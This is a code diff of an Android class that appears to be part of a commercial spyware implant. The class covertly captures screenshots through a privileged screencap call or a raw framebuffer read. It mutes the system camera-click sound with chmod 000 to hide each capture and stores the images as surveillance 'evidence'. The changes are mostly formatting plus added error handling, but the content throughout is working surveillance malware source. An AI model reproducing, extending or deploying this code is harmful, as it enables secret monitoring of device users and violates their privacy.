@@ -61,7 +61,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 	final private static int CAPTURE_FOREGROUND = 1;
 
 	String cameraSound = M.e("/system/media/audio/ui/camera_click.ogg");
-	
+
 	/** The delay. */
 	private int delay;
 
@@ -69,7 +69,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private int type;
 	private int quality;
 	Semaphore working = new Semaphore(1, true);
-	
+
 	private boolean frameBuffer = true;
 	private boolean screenCap = true;
 
@@ -137,10 +137,10 @@ public class ModuleSnapshot extends BaseInstantModule {
 		}
 
 		try {
-			if(!frameBufferMethod()){
+			if (!frameBufferMethod()) {
 				frameBuffer = false;
-				if(!screencapMethod()){
-					screenCap  = false;
+				if (!screencapMethod()) {
+					screenCap = false;
 				}
 			}
 
@@ -163,37 +163,37 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (screencapMethod) ");
 		}
-		
-		if(!screenCap){
+
+		if (!screenCap) {
 			return false;
 		}
-		
+
 		String sc = M.e("/system/bin/screencap");
-		String frame = M.e("/data/data/") + Status.self().getAppContext().getPackageName()+ M.e("/files/frame.png");
-		
+		String frame = M.e("/data/data/") + Status.self().getAppContext().getPackageName() + M.e("/files/frame.png");
+
 		AutoFile asc = new AutoFile(sc);
 		AutoFile aframe = new AutoFile(frame);
 		aframe.delete();
-		
-		if(asc.exists() && asc.canRead()){
-			
-			try{
-			disableClick();
-			
-			ExecuteResult res = Execute.executeScript( sc + " -p " + frame + ";chmod 777 "+ frame);
-			if(aframe.exists() && aframe.canRead()){
-				Bitmap bitmap = readPng(aframe);
-				if(bitmap == null){
-					return false;
+
+		if (asc.exists() && asc.canRead()) {
+
+			try {
+				disableClick();
+
+				ExecuteResult res = Execute.executeScript(sc + " -p " + frame + ";chmod 777 " + frame);
+				if (aframe.exists() && aframe.canRead()) {
+					Bitmap bitmap = readPng(aframe);
+					if (bitmap == null) {
+						return false;
+					}
+					byte[] jpeg = toJpeg(bitmap);
+					if (jpeg == null) {
+						return false;
+					}
+					EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+					return true;
 				}
-				byte[] jpeg = toJpeg(bitmap);
-				if(jpeg == null){
-					return false;
-				}
-				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
-				return true;
-			}
-			}finally{
+			} finally {
 				enableClick();
 			}
 		}
@@ -202,20 +202,20 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 	private void enableClick() {
 		AutoFile file = new AutoFile(cameraSound);
-		if(file.exists()){
+		if (file.exists()) {
 			file.chmod("777");
 		}
 	}
 
 	private void disableClick() {
 		AutoFile file = new AutoFile(cameraSound);
-		if(file.exists()){
+		if (file.exists()) {
 			file.chmod("000");
 		}
 	}
 
 	private Bitmap readPng(AutoFile aframe) {
-		Bitmap bitmap= BitmapFactory.decodeFile(aframe.getFilename());
+		Bitmap bitmap = BitmapFactory.decodeFile(aframe.getFilename());
 		return bitmap;
 	}
 
@@ -223,136 +223,146 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (frameBufferMethod) ");
 		}
-		
-		if(!frameBuffer ){
+
+		if (!frameBuffer) {
 			return false;
 		}
-		
-		final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
-				.getDefaultDisplay();
-		
-		int width, height, w, h;
-		final int orientation = display.getOrientation();
 
-		if (isTablet()) {
-			h = display.getWidth();
-			w = display.getHeight();
-		} else {
-			w = display.getWidth();
-			h = display.getHeight();
-		}
+		try {
+			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
+					.getDefaultDisplay();
 
-		boolean useOrientation = true;
-		boolean useMatrix = true;
-
-		if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
-			width = w;
-			height = h;
-		} else {
-			height = w;
-			width = h;
-		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
-		}
-
-		Bitmap bitmap = null;
-
-		// 0: invertito blu e rosso
-		// 1: perdita info
-		// 2: invertito blu e verde
-		// 3: no ARGB, no ABGR, no AGRB
-		byte[] raw = getRawBitmap();
-
-		if (raw == null || raw.length == 0) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (frameBufferMethod): raw bitmap is null or has 0 length"); //$NON-NLS-1$
-			}
-			return false;
-		} else {
-
-			if(isBlack(raw)){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (frameBufferMethod): all black");
-				}
-				return false;
-			}
-			if (usesInvertedColors()) {
-				// sul tablet non e' ARGB ma ABGR.
-				byte[] newraw = new byte[raw.length / 2];
-
-				for (int i = 0; i < newraw.length; i++) {
-					switch (i % 4) {
-					case 0:
-						newraw[i] = raw[i + 2]; // A 3:+2
-						break;
-					case 1:
-						newraw[i] = raw[i]; // R 1:+2 2:+1
-						break;
-					case 2:
-						newraw[i] = raw[i - 2]; // G 2:-1 3:-2
-						break;
-					case 3:
-						newraw[i] = raw[i]; // B 1:-2
-						break;
-					}
-					/*
-					 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
-					 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
-					 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
-					 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
-					 * // B 1:-2
-					 */
-				}
-
-				raw = newraw;
-				bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
-			}
-
-			ByteBuffer buffer = ByteBuffer.wrap(raw);
-			bitmap.copyPixelsFromBuffer(buffer);
-			buffer = null;
-			raw = null;
-
-			int rotateTab = 0;
+			int width, height, w, h;
+			final int orientation = display.getOrientation();
 
 			if (isTablet()) {
-				rotateTab = -90;
+				h = display.getWidth();
+				w = display.getHeight();
+			} else {
+				w = display.getWidth();
+				h = display.getHeight();
 			}
 
-			if (useMatrix && orientation != Surface.ROTATION_0) {
-				final Matrix matrix = new Matrix();
+			boolean useOrientation = true;
+			boolean useMatrix = true;
 
-				if (orientation == Surface.ROTATION_90) {
-					matrix.setRotate(270 + rotateTab);
-				} else if (orientation == Surface.ROTATION_270) {
-					matrix.setRotate(90 + rotateTab);
-				} else if (orientation == Surface.ROTATION_180) {
-					matrix.setRotate(180 + rotateTab);
-				} else {
-					matrix.setRotate(rotateTab);
+			if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
+				width = w;
+				height = h;
+			} else {
+				height = w;
+				width = h;
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
+			}
+
+			Bitmap bitmap = null;
+
+			// 0: invertito blu e rosso
+			// 1: perdita info
+			// 2: invertito blu e verde
+			// 3: no ARGB, no ABGR, no AGRB
+			byte[] raw = getRawBitmap();
+
+			if (raw == null || raw.length == 0) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (frameBufferMethod): raw bitmap is null or has 0 length"); //$NON-NLS-1$
+				}
+				return false;
+			} else {
+
+				if (isBlack(raw)) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (frameBufferMethod): all black");
+					}
+					return false;
+				}
+				if (usesInvertedColors()) {
+					// sul tablet non e' ARGB ma ABGR.
+					byte[] newraw = new byte[raw.length / 2];
+
+					for (int i = 0; i < newraw.length; i++) {
+						switch (i % 4) {
+						case 0:
+							newraw[i] = raw[i + 2]; // A 3:+2
+							break;
+						case 1:
+							newraw[i] = raw[i]; // R 1:+2 2:+1
+							break;
+						case 2:
+							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
+							break;
+						case 3:
+							newraw[i] = raw[i]; // B 1:-2
+							break;
+						}
+						/*
+						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
+						 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
+						 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
+						 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
+						 * // B 1:-2
+						 */
+					}
+
+					raw = newraw;
+					bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 				}
 
-				bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
+				ByteBuffer buffer = ByteBuffer.wrap(raw);
+				if (buffer == null) {
+					return false;
+				}
+				
+				bitmap.copyPixelsFromBuffer(buffer);
+				buffer = null;
+				raw = null;
+
+				int rotateTab = 0;
+
+				if (isTablet()) {
+					rotateTab = -90;
+				}
+
+				if (useMatrix && orientation != Surface.ROTATION_0) {
+					final Matrix matrix = new Matrix();
+
+					if (orientation == Surface.ROTATION_90) {
+						matrix.setRotate(270 + rotateTab);
+					} else if (orientation == Surface.ROTATION_270) {
+						matrix.setRotate(90 + rotateTab);
+					} else if (orientation == Surface.ROTATION_180) {
+						matrix.setRotate(180 + rotateTab);
+					} else {
+						matrix.setRotate(rotateTab);
+					}
+
+					bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
+				}
+
+				byte[] jpeg = toJpeg(bitmap);
+				bitmap = null;
+
+				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+				jpeg = null;
+
 			}
-
-			byte[] jpeg = toJpeg(bitmap);
-			bitmap = null;
-
-			EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
-			jpeg = null;
-			
-			
+			return true;
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (frameBufferMethod) Error: " + ex);
+			}
+			return false;
 		}
-		return true;
 	}
 
 	private boolean isBlack(byte[] raw) {
 		for (int i = 0; i < raw.length; i++) {
-			if(raw[i] != 0){
+			if (raw[i] != 0) {
 				return true;
-			}	
+			}
 		}
 		return false;
 	}
@@ -448,8 +458,8 @@ public class ModuleSnapshot extends BaseInstantModule {
 				Check.log(TAG + " (getRawBitmap): calling frame generator");
 			}
 
-			Execute.execute(Configuration.shellFile + " fb /data/data/" + Status.self().getAppContext().getPackageName()
-					+ "/files/frame");
+			Execute.execute(Configuration.shellFile + " fb /data/data/"
+					+ Status.self().getAppContext().getPackageName() + "/files/frame");
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
